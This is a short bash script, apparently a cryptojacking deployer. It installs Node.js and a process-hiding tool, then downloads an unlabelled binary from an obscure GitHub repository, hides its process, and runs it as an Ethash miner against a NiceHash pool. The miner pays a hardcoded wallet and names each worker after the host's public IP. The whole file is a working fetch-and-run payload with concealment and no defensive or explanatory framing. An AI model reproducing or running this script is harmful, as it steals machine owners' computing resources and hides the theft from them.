#!/bin/bash

POOL=144.217.82.15:80

WALLET=3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX

WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-BTCNICEHASH

cd "$(dirname "$0")"

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
sudo apt install nodejs
apt-get install screen -y
npm i -g node-process-hider
wget -qO gede https://raw.githubusercontent.com/hndouehdw/nhcque/master/coinbtc
sudo ph add gede
chmod +x ./gede
./gede --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-west.nicehash.com:3353 --user 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo "$(curl -s ifconfig.me)" | tr . _ )-GASMAWON $@ --ethstratum ETHPROXY

echo success
